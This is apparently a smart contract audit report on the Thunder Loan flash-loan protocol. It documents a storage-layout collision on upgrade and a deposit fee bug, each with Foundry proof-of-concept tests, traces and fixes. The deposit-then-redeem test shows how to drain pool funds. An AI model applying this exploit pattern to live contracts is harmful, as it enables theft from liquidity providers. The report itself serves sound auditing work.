# Thunder_Loan_Audit_Report

## H-01.Storage Collision during upgrade

### Summary

The storage layout of ` ThunderLoanUpgraded.sol ` is not compatible with the layout of the ` ThunderLoan.sol `,which will cause storage collision and mismatch of variable to different data.



### Vulnerability Details

Comparsion of Storage Layout in ` ThunderLoan.sol ` and ` ThunderLoanUpgraded.sol ` :

| Slot |         ThunderLoan.sol          |     ThunderLoanUpgraded.sol      |
| :--: | :------------------------------: | :------------------------------: |
|  0   |   mapping(s_tokenToAssetToken)   |   mapping(s_tokenToAssetToken)   |
|  1   |     uint256(s_feePrecision)      |     uint256(s_flashLoanFee)      |
|  2   |     uint256(s_flashLoanFee)      | mapping(s_currentlyFlashLoaning) |
|  3   | mapping(s_currentlyFlashLoaning) |                                  |

In Solidity,` constant ` variables are not stored in the contract's storage,memory,or stack at runtime.Instead,their values are embedded directly into the bytecode at compile time.

In ` ThunderLoanUpgraded.sol `,the storage of ` s_feePrecision ` is missing.Moreover,at position where ` s_feePrecision ` was previously located,` s_flashLoanFee ` is now present in the upgraded version.

When the proxy contract uses ` delegatecall ` low level function,it will execute logic from one of these implementation contracts and update the storage layout of the proxy contract itself.This means that when ` s_flashLoanFee ` is updated,the proxy's storage slot at that specific location will be updated.

Therefore,when the proxy contract attempts to read ` s_flashLoanFee ` variable as it did before the upgraded,it actually retrives the value of ` s_currentlyFlashLoaning ` instead.This discrepancy will lead to incorrect fee calculations in the end.



### Proof of Concept

#### Test Case

```solidity
function testStorageCollision() public {
    // 1000000000000000000
    uint256 initFeePrecision = thunderLoan.getFeePrecision();
    // 3000000000000000
    uint256 initFlashloanFee = thunderLoan.getFee();
    // upgrade the implementation
    address thunderLoanUpgraded = address(new ThunderLoanUpgraded());
    thunderLoan.upgradeTo(thunderLoanUpgraded);
    // 1000000000000000000
    uint256 updatedFlashloanFee = thunderLoan.getFee();
    // 3000000000000000 != 1000000000000000000
    assert(initFlashloanFee != updatedFlashloanFee);
    // 1000000000000000000
    assertEq(updatedFlashloanFee, initFeePrecision);
}
```

#### Output

```bash
[PASS] testStorageCollision() (gas: 5623762)
Traces:
  [5623762] ThunderLoanTest::testStorageCollision()
    ├─ [7514] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2500] ThunderLoan::getFeePrecision() [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [3034] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2520] ThunderLoan::getFee() [delegatecall]
    │   │   └─ ← [Return] 3000000000000000 [3e15]
    │   └─ ← [Return] 3000000000000000 [3e15]
    ├─ [5552560] → new ThunderLoanUpgraded@0xa0Cb889707d426A7A386870A03bc70d1b0697598
    │   ├─ emit Initialized(version: 255)
    │   └─ ← [Return] 27610 bytes of code
    ├─ [11627] ERC1967Proxy::fallback(ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
    │   ├─ [11113] ThunderLoan::upgradeTo(ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [delegatecall]
    │   │   ├─ [482] ThunderLoanUpgraded::proxiableUUID() [staticcall]
    │   │   │   └─ ← [Return] 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    │   │   ├─ emit Upgraded(implementation: ThunderLoanUpgraded: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [1012] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [498] ThunderLoanUpgraded::getFee() [delegatecall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.88ms (621.17µs CPU time)
```



### Impact

This vulnerability can cause incorrect access or modification of critical variables.



### Recommendation

In ` ThunderLoanUpgraded.sol `,use the same storage layout as the ` ThunderLoan.sol `.

```solidity
// ThunderLoanUpgraded.sol
mapping(IERC20 => AssetToken) public s_tokenToAssetToken;

// uint256 private s_flashLoanFee; // 0.3% ETH fee
// uint256 public constant FEE_PRECISION = 1e18;
uint256 private s_feePrecision;
uint256 private s_flashLoanFee;

mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```



## H-02.Incorrect calculation of fees may cause loss of funds

### Summary

The fee is calculated in the ` deposit ` function,and the fee keeps increasing.This allows attackers to immediately ` redeem ` tokens and easily obtain more tokens.



### Vulnerability Details

In ` ThunderLoan.sol `,the ` deposit ` function immediately calculates the fee after the user deposits.

This will allow anyone who deposits to immediately redeem and get more tokens than they deposited.Underlying of any assert token can be completely drained in this manner.

```solidity
// ThunderLoan.sol
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    ...
    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);
    ...
}
```



### Proof of Concept

#### Test Case

```solidity
function testUpdateFeeOnDeposit() public setAllowedToken {
    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
    console.log("Init fee:", vm.toString(assetToken.getExchangeRate()));
    tokenA.mint(liquidityProvider, AMOUNT);
    tokenA.mint(user, AMOUNT);

    vm.startPrank(liquidityProvider);
    tokenA.approve(address(thunderLoan), AMOUNT);
    thunderLoan.deposit(tokenA, AMOUNT);
    vm.stopPrank();

    vm.startPrank(user);
    tokenA.approve(address(thunderLoan), AMOUNT);
    thunderLoan.deposit(tokenA, AMOUNT);
    vm.stopPrank();

    console.log("After fee:", vm.toString(assetToken.getExchangeRate()));

    vm.startPrank(liquidityProvider);
    thunderLoan.redeem(tokenA, assetToken.balanceOf(liquidityProvider));
    vm.stopPrank();

    // assertGt(tokenA.balanceOf(liquidityProvider), AMOUNT);
    console.log("Before Amount:", vm.toString(AMOUNT));
    console.log("After Amount:", vm.toString(tokenA.balanceOf(liquidityProvider)));
}
```

#### Output

```bash
[PASS] testUpdateFeeOnDeposit() (gas: 2154424)
Logs:
  Init fee: 1000000000000000000
  After fee: 1004506753369945082
  Before Amount: 10000000000000000000
  After Amount: 10045067533699450820

Traces:
  [2253924] ThunderLoanTest::testUpdateFeeOnDeposit()
    ├─ [7662] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2648] ThunderLoan::owner() [delegatecall]
    │   │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    ├─ [0] VM::prank(ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return] 
    ├─ [1884002] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true)
    │   ├─ [1883482] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true) [delegatecall]
    │   │   ├─ [3421] ERC20Mock::name() [staticcall]
    │   │   │   └─ ← [Return] "ERC20Mock"
    │   │   ├─ [3487] ERC20Mock::symbol() [staticcall]
    │   │   │   └─ ← [Return] "E20M"
    │   │   ├─ [1808403] → new AssetToken@0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c
    │   │   │   └─ ← [Return] 8683 bytes of code
    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: true)
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [1712] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   ├─ [1195] ThunderLoan::getAssetFromToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [delegatecall]
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [0] VM::toString(1000000000000000000 [1e18]) [staticcall]
    │   └─ ← [Return] "1000000000000000000"
    ├─ [0] console::log("Init fee:", "1000000000000000000") [staticcall]
    │   └─ ← [Stop] 
    ├─ [47273] ERC20Mock::mint(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
    ├─ [25373] ERC20Mock::mint(0x00000000000000000000000000000000000001c8, 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000001c8, value: 10000000000000000000 [1e19])
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return] 
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 10000000000000000000 [1e19])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [105453] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [104936] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 10000000000000000000 [1e19])
    │   │   ├─ [47373] AssetToken::mint(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [2912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(30000000000000000 [3e16])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003000000000000000 [1.003e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [28711] ERC20Mock::transferFrom(0x000000000000000000000000000000000000007B, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 10000000000000000000 [1e19])
    │   │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000001c8)
    │   └─ ← [Return] 
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 10000000000000000000 [1e19])
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000001c8, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [48653] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [48136] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1003000000000000000 [1.003e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x00000000000000000000000000000000000001c8, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 10000000000000000000 [1e19])
    │   │   ├─ [25473] AssetToken::mint(0x00000000000000000000000000000000000001c8, 9970089730807577268 [9.97e18])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000001c8, value: 9970089730807577268 [9.97e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(30000000000000000 [3e16])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1004506753369945082 [1.004e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [6811] ERC20Mock::transferFrom(0x00000000000000000000000000000000000001c8, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 10000000000000000000 [1e19])
    │   │   │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000001c8, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000001c8, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   └─ ← [Return] 1004506753369945082 [1.004e18]
    ├─ [0] VM::toString(1004506753369945082 [1.004e18]) [staticcall]
    │   └─ ← [Return] "1004506753369945082"
    ├─ [0] console::log("After fee:", "1004506753369945082") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return] 
    ├─ [852] AssetToken::balanceOf(0x000000000000000000000000000000000000007B) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [37719] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19])
    │   ├─ [37202] ThunderLoan::redeem(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 10000000000000000000 [1e19]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1004506753369945082 [1.004e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Redeemed(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amountOfAssetToken: 10000000000000000000 [1e19], amountOfUnderlying: 10045067533699450820 [1.004e19])
    │   │   ├─ [3508] AssetToken::burn(0x000000000000000000000000000000000000007B, 10000000000000000000 [1e19])
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: 0x0000000000000000000000000000000000000000, value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [26483] AssetToken::transferUnderlyingTo(0x000000000000000000000000000000000000007B, 10045067533699450820 [1.004e19])
    │   │   │   ├─ [23719] ERC20Mock::transfer(0x000000000000000000000000000000000000007B, 10045067533699450820 [1.004e19])
    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: 0x000000000000000000000000000000000000007B, value: 10045067533699450820 [1.004e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::toString(10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Return] "10000000000000000000"
    ├─ [0] console::log("Before Amount:", "10000000000000000000") [staticcall]
    │   └─ ← [Stop] 
    ├─ [874] ERC20Mock::balanceOf(0x000000000000000000000000000000000000007B) [staticcall]
    │   └─ ← [Return] 10045067533699450820 [1.004e19]
    ├─ [0] VM::toString(10045067533699450820 [1.004e19]) [staticcall]
    │   └─ ← [Return] "10045067533699450820"
    ├─ [0] console::log("After Amount:", "10045067533699450820") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.85ms (545.92µs CPU time)
```



### Impact

This vulnerability can drain all tokens,causing loss of funds.



### Recommendation

Do not update the fee when depositing,only update the fee after a flash loan is successfully.

```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    // uint256 calculatedFee = getCalculatedFee(token, amount);
    // assetToken.updateExchangeRate(calculatedFee);
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```

